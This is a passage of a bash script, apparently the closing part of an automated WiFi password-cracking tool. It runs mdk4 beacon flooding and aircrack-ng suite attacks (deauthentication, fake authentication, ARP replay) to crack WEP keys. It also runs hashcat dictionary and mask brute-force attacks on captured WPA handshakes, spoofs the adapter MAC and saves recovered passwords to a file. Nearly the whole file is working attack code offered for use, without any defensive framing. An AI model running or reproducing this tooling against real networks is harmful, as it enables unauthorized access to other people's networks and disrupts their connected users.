    gnome-terminal --geometry=70x3-10000-10000 -- timeout 95s mdk4 $wifi_adapter b -n $bssid_name_original -c $channel -w a
    sleep 5
}



function crack_wep() {
    output_file="$targets_path/$bssid_name/WEP_output.txt"
    airodump_terminal_pid=""
    arp_replay_terminal_pid=""

    if [ -d "$targets_path/$bssid_name" ]; then
        rm -rf "$targets_path/$bssid_name"
    fi
    mkdir -p "$targets_path/$bssid_name" # Ensure directory is created
    touch "$output_file"

    echo -e "\n${ORANGE}Starting WEP Cracking:${RESET}"
    echo -e "Monitor the ${CYAN}#Data${RESET} column in the ${NEON_GREEN}aircrack-ng${RESET} window. You typically need 30K-50K IVs."
    
    # Start airodump-ng in a new terminal and get the terminal's PID
    # The 'exec bash' at the end of commands run in gnome-terminal keeps the terminal open after the command finishes, useful for inspection.
    # Remove 'exec bash' if you want the terminal to close automatically.
    gnome-terminal --geometry=92x17-10000-10000 -- bash -c "airodump-ng --bssid $bssid_address --channel $channel --write \"$targets_path/$bssid_name/$bssid_name\" ${wifi_adapter}; exec bash" &
    airodump_terminal_pid=$!

    #echo -e "[*] Waiting 6 seconds for airodump-ng to initialize and create capture files..."
    sleep 6

    # Check if capture file was created
    if [ ! -f "$targets_path/$bssid_name/$bssid_name-01.cap" ]; then
        echo -e "${RED}Error: Capture file ($targets_path/$bssid_name/$bssid_name-01.cap) not created. Airodump-ng might have failed. Aborting WEP crack.${RESET}"
        if [ -n "$airodump_terminal_pid" ]; then kill "$airodump_terminal_pid" 2>/dev/null; fi
        return 1
    fi
    
    echo -e "[*] Attempting deauthentication attack to generate IVs..."
    gnome-terminal --geometry=78x4-10000-10000 -- timeout 10s aireplay-ng --deauth 10 -a "$bssid_address" "${wifi_adapter}"
    # No need to wait for deauth terminal, it's short-lived

    echo -e "[*] Attempting fake authentication with AP ($bssid_address)..."
    gnome-terminal --geometry=78x5-10000-10000 -- bash -c "aireplay-ng -1 0 -a $bssid_address -h $random_mac ${wifi_adapter}; echo 'Fake auth attempt finished. Press Enter to close.'; read"
    #echo -e "[*] Pausing for 3 seconds after fake authentication attempt..."
    sleep 3 # Give time for fake auth to potentially associate

    echo -e "[*] Attempting ARP Replay attack to generate IVs faster..."
    # Start ARP Replay in a new terminal and get its PID
    gnome-terminal --geometry=78x6-10000+10000 -- bash -c "aireplay-ng -3 -b $bssid_address -h $random_mac ${wifi_adapter}; echo 'ARP Replay attack finished or stopped. Press Enter to close.'; read" &
    arp_replay_terminal_pid=$!
    sleep 2 # Give ARP replay a moment to start

    #echo -e "\n[*] Entering cracking loop. Will attempt to crack with aircrack-ng periodically."
    #echo -e "    You can monitor IVs in the airodump-ng window and cracking attempts in new aircrack-ng windows."

    attempts=0
    while true; do
        ((attempts++))
        echo -e "\n--- Cracking Attempt $attempts ---"
        
        # Check if key already found by a previous manual check or other process
        if grep -q "KEY FOUND!" "$output_file"; then
            echo -e "${NEON_GREEN}Key already found in output file (perhaps manually or by a concurrent process)!${RESET}"
            break
        fi

        #echo -e "[*] Running aircrack-ng (10s timeout)..."
        # Use --wait for this terminal as we want the script to wait for aircrack-ng's attempt
        # CRITICAL FIX: Changed 'tee' to 'tee -a' to append to the output file
        gnome-terminal --wait --geometry=84x23-10000+10000 -- bash -c "timeout 10s aircrack-ng -b $bssid_address \"$targets_path/$bssid_name/$bssid_name-01.cap\" | tee -a \"$output_file\"; echo 'Aircrack-ng attempt finished. This window will close in 5s.'; sleep 5"
        
        # Check if aircrack-ng found the key in its latest output
        if grep -q "KEY FOUND!" "$output_file"; then
            echo -e "${NEON_GREEN}KEY FOUND by aircrack-ng!${RESET}"
            break
        else
            echo -e "[*] Key not found in this attempt. Will retry after 3 seconds."
            #echo -e "    Ensure enough IVs (#Data) are being collected."
            #echo -e "    If IV count is stagnant, ARP replay might not be effective (e.g., no clients or AP not responding to ARP requests)."
        fi
    
        sleep 3 # Wait before next cracking attempt
    done

    #echo -e "\n[*] Exited cracking loop."

    # Kill the airodump-ng and ARP replay terminals
    if [ -n "$airodump_terminal_pid" ] && kill -0 "$airodump_terminal_pid" 2>/dev/null; then
        echo "[*] Closing airodump-ng terminal..."
        kill "$airodump_terminal_pid" 2>/dev/null
    fi
    if [ -n "$arp_replay_terminal_pid" ] && kill -0 "$arp_replay_terminal_pid" 2>/dev/null; then
        echo "[*] Closing ARP replay terminal..."
        kill "$arp_replay_terminal_pid" 2>/dev/null
    fi
    # General cleanup for any stray aireplay processes
    pkill aireplay-ng > /dev/null 2>&1
    pkill airodump-ng > /dev/null 2>&1


    if grep -q "KEY FOUND!" "$output_file"; then
        # Try to extract ASCII first
        wifi_pass=$(grep "KEY FOUND!" "$output_file" | tail -n 1 | sed -n 's/.*ASCII: \([^)]*\).*/\1/p')
        if [ -z "$wifi_pass" ]; then
            # If ASCII not found or empty, extract HEX
            wifi_pass=$(grep "KEY FOUND!" "$output_file" | tail -n 1 | sed -n 's/.*KEY FOUND! \[ \([^ ]*\) \].*/\1/p' | tr -d ':')
            echo -e "${ORANGE}WEP Key (HEX):${RESET} ${NEON_GREEN}$wifi_pass${RESET}"
        else
            echo -e "${ORANGE}WEP Key (ASCII):${RESET} ${NEON_GREEN}$wifi_pass${RESET}"
        fi
        
        echo -e "\n\n${BLUE}The WiFi password for${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET} ${NEON_GREEN}$wifi_pass${RESET}"
        echo -e "Important: If this is a HEX key, you might not need to enter the colons (:)."
        echo -e "---" >> "$targets_path/wifi_passwords.txt"
        printf "The WiFi password for %s (%s) is: %s\n" "$bssid_name_original" "$bssid_address" "$wifi_pass" >> "$targets_path/wifi_passwords.txt"
    else
        echo -e "${RED}Failed to crack WEP password after attempts.${RESET}"
        echo -e "Consider running the capture for a longer time to collect more IVs."
    fi

    cleanup # Call your main cleanup function
    #echo -e "\nReturning to network selection or exiting..."
    # Decide if you want to call another_scan_prompt or exit from here
    # For now, it will fall through to the calling logic in choose_network
    # If you want to exit script after WEP attempt: exit 0 (success) or exit 1 (if failed)
    # another_scan_prompt 
    exit 1
}



function dictionary_attack() {
while true; do
    echo -e "\n${BOLD}Choose a wordlist:${RESET}"
    echo "1. Use rockyou.txt"
    echo "2. Use a different dictionary"
    read -p "Enter your choice (1 or 2): " wordlist_choice

    case "$wordlist_choice" in
        1)
            dict_file="$rockyou_file"
            break
            ;;
        2)
            read -e -p "Enter the full path to your custom dictionary file: " custom_dict
            if [ -f "$custom_dict" ]; then
                dict_file="$custom_dict"
                break
            else
                echo -e "${RED}Error:${RESET} File does not exist. Please try again."
            fi
            ;;
        *)
            echo -e "${RED}    [✘] Invalid choice.${RESET} (select 1 or 2)"
            ;;
    esac
done

echo -e "\n${BOLD}Cracking WiFi password using:${RESET} $dict_file ${BOLD}->>${RESET}\n"

    gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c \
    "hashcat -m 22000 -a 0 \"$targets_path/$bssid_name/hash.hc22000\" \"$dict_file\" \
    --outfile \"$targets_path/$bssid_name/$bssid_name-wifi_password.txt\" \
    --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable; sleep 5"

    echo
    if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
        wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
        echo -e "${BLUE}The WiFi password of${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET}\t${ORANGE}$wifi_pass${RESET}"
        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
        
        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with// } }" "$targets_path/wifi_passwords.txt"
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with.*/ { s/\nPassword not cracked with.*// } }" "$targets_path/wifi_passwords.txt"

        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ d; }" "$targets_path/wifi_passwords.txt"

        
        
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The WiFi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
        rm -r "$targets_path/$bssid_name"
        exit 1
    else
        echo -e "\n${RED}Couldn't crack the password with the selected wordlist.${RESET}\n"
        
        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with selected wordlist" "$targets_path/wifi_passwords.txt"
        
        echo
        read -p "Do you want to try different attack? (Y/n): " choice
        case $choice in
            y|Y)
                choose_attack
                ;;
            n|N)
                another_scan_prompt
                ;;
            *)
                echo -e "${RED}Invalid choice.${RESET} Please enter 'y' or 'n'."
                ;;
        esac        
    fi
}



function brute-force_attack() {
    
    echo -e "${BOLD}\nCracking WiFi password with Hashcat ->>${RESET}\n"

    # Ask user for password length
    while true; do
        read -p "Enter password length (WiFi min: 8): " password_length
        if [[ -z "$password_length" ]]; then
            password_length=8
            echo "default is 8"
            break
        fi
        if [[ "$password_length" =~ ^[0-9]+$ ]] && [[ "$password_length" -gt 0 ]]; then
            break
        else
            echo "Invalid password length. Please enter a positive number."
        fi
    done

    while true; do
        full_mask=""
        echo -e "\n${BOLD}Choose how to run the Brute-Force:${RESET}"
        echo -e "${RED}1)${RESET} Try every possible combination                     ?a   -   (ABC-abc-123-!@#)   |   $password_length^94 possibilities.\n"
        echo -e "${RED}2)${RESET} Customize each position of the password:"
        echo "   1.  Uppercase                                      ?u   -   (ABC)"
        echo "   2.  Lowercase                                      ?l   -   (abc)"
        echo "   3.  Numbers                                        ?d   -   (123)"
        echo "   4.  Special characters                             ?s   -   (!@#)"
        echo "   5.  Uppercase + Numbers                            ?1   -   (ABC-123)"
        echo "   6.  Lowercase + Numbers                            ?2   -   (abc-123)"
        echo "   7.  Uppercase + Lowercase                          ?3   -   (ABC-abc)"
        echo "   8.  Uppercase + Lowercase + Numbers                ?4   -   (ABC-abc-123)"        
        echo "   9.  Uppercase + Lowercase + Numbers + specials     ?a   -   (ABC-abc-123-!@#)"
        echo "   10. Enter a specific character: __"
        echo -e "\n\n"

	while true; do
	    echo -n -e "Enter your choice (${RED}1${RESET}-${RED}2${RESET}): "
	    read option
	    if [[ "$option" -eq 1 || "$option" -eq 2 ]]; then
		break
	    else
		echo -e "${RED}Invalid option.${RESET}"
		sleep 1
		tput cuu1; tput el; tput cuu1; tput el;
	    fi
	done
        
        if [[ "$option" -eq 1 ]]; then
            echo -e "\nWe will check all possible characters (ABC-abc-123-!@#) for each position."
            char_set="?a"
            for (( i=0; i<password_length; i++ )); do
                full_mask+="$char_set"
            done
            break

        elif [[ "$option" -eq 2 ]]; then
            positions=()
            charset=""
 
            tput cuu1; tput el; tput cuu1; tput el;
            echo -n -e "${BOLD}Current mask:	${RESET} "
            for (( j=1; j<=password_length; j++ )); do
                if [[ -z "${positions[j-1]}" ]]; then
                    echo -n -e "$j.${CYAN}[${RESET}  ${CYAN}]${RESET} "
                else
                    echo -n -e "$j.${CYAN}[${RESET} ${RED}${positions[j-1]}${CYAN} ${CYAN}]${RESET} "
                fi
            done
            echo   
 
            for (( i=1; i<=password_length; i++ )); do
                    read -p "Choose an option for position $i/$password_length  (Choose 1-10): " choice
                    case "$choice" in
                        1) positions+=("?u");; 
                        2) positions+=("?l");; 
                        3) positions+=("?d");;
                        4) positions+=("?s");;
                        5) positions+=("?1"); charset+="-1 ?u?d ";;  
                        6) positions+=("?2"); charset+="-2 ?l?d ";;
                        7) positions+=("?3"); charset+="-3 ?u?l ";;
                        8) positions+=("?4"); charset+="-4 ?u?l?d ";;
                        9) positions+=("?a");;                         
                        10)
                            while true; do
                                read -p "  Enter the specific character for position $i: " specific_char
                                if [[ ${#specific_char} -eq 1 ]]; then
                                    positions+=("$specific_char")
                                    tput cuu1; tput el; tput cuu1; tput el; 
                                    echo -n -e "${BOLD}Current mask:	${RESET} "
					for (( j=1; j<=password_length; j++ )); do
					    if [[ -z "${positions[j-1]}" ]]; then
						echo -n -e "$j.${CYAN}[${RESET}  ${CYAN}]${RESET} "
					    else
						echo -n -e "$j.${CYAN}[${RESET} ${RED}${positions[j-1]}${CYAN} ${CYAN}]${RESET} "
					    fi
					done
                                    echo
                                    break
                                else
                                    tput cuu1; tput el; tput cuu1; tput el;
                                    echo -e "${RED}Invalid input!${RESET} Please enter exactly ONE character."
                                fi
                            done
                            ;;
                        *) echo -e "${RED}Invalid choice!${RESET} Please enter a valid option (1-10)." && sleep 2;
                           tput cuu1; tput el;
                           ((i--));;
                    esac
           
                tput cuu1; tput el; tput cuu1; tput el;
                echo -n -e "${BOLD}Current mask:	${RESET} "
                for (( j=1; j<=password_length; j++ )); do
                    if [[ -z "${positions[j-1]}" ]]; then
                        echo -n -e "$j.${CYAN}[${RESET}  ${CYAN}]${RESET} "
                    else
                        echo -n -e "$j.${CYAN}[${RESET} ${RED}${positions[j-1]}${CYAN} ${CYAN}]${RESET} "
                    fi
                done
                echo                   
            done
            full_mask=$(IFS=; echo "${positions[*]}")
            break
        fi
    done

    echo -e "\n\n${ORANGE}Generated Hashcat mask:${RESET} ${RED}$full_mask${RESET}\n\n"

    # Run hashcat with the correct options
    if [[ -n "$charset" ]]; then
        gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" $charset $full_mask --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable" 
    else
        gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" $full_mask --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable" 
    fi
           
    echo
    if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
        wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
        echo -e "${BLUE}The WiFi password of${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET}	${ORANGE}$wifi_pass${RESET}"
        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')

        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with.*/ { s/\nPassword not cracked with.*// } }" "$targets_path/wifi_passwords.txt"
        
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The WiFi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
        rm -r $targets_path/"$bssid_name" 
        exit 1
    else
        echo -e "\n${RED}Couldn't cracked with Brute-Force with this masking: $full_mask${RESET}\n"
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Brute-Force of this masking: $full_mask" "$targets_path/wifi_passwords.txt"
        echo
        read -p "Do you want to try different attack (Y/n)? " choice
        case $choice in
            y|Y)
                choose_attack
                ;;
            n|N)
                another_scan_prompt
                ;;
            *)
                echo -e "${RED}Invalid choice.${RESET} Please enter 'y' or 'n'."
                ;;
        esac        
    fi    
}



function another_scan_prompt() {
    while true; do
        echo
        echo -e "${BOLD}[+] What would you like to do next ?${RESET}"
        echo "    1) Choose different network to attack"
        echo "    2) Run a new Scan"
        echo "    3) Exit"
        read -p "Enter your choice (1-3): " choice
        echo
        case $choice in
            1)
                choose_network
	
		if [[ "$encryption" == "WPA3 WPA2" ]]; then            
		    mixed_encryption
		fi    

		attacks
		cleanup	
		choose_attack
                break
                ;;
            2)
                main_process
                break
                ;;
            3)
                echo -e "\nBye."
                cleanup
                exit 1
                ;;
            *)
                echo "Invalid input. Please enter 1-3."
                ;;
        esac
    done
}



function cleanup() {
	chown -R $UN:$UN $targets_path
	gnome-terminal --geometry=1x1-10000-10000 -- airmon-ng stop "$wifi_adapter"
	gnome-terminal --geometry=1x1-10000-10000 -- systemctl start NetworkManager
}



function choose_attack() {
	while true; do
	    echo -e "\n\n${ORANGE}Choose how to Crack the Password:${RESET}"
	    echo "1) Dictionary attack"
	    echo "2) Brute-Force attack"
	    read -p "Enter your choice: " choice
	    echo

	    case $choice in
		1)
		    dictionary_attack
		    ;;
		2)
		    brute-force_attack
		    ;;
		*)
		    echo "${RED}    [✘] Invalid choice.${RESET} (select 1 or 2)"
		    ;;
	    esac
	done
}



# ------------------------------
# Main Process
# ------------------------------
function main_process() {
	adapter_config
	spoof_adapter_mac	
	
	#sleep 500
	
	network_scanner

	if [[ "$encryption" == "WPA3 WPA2" ]]; then            
            mixed_encryption
        fi    
        
        attacks
	cleanup	
	choose_attack
}

first_setup
enable_gpu
main_process


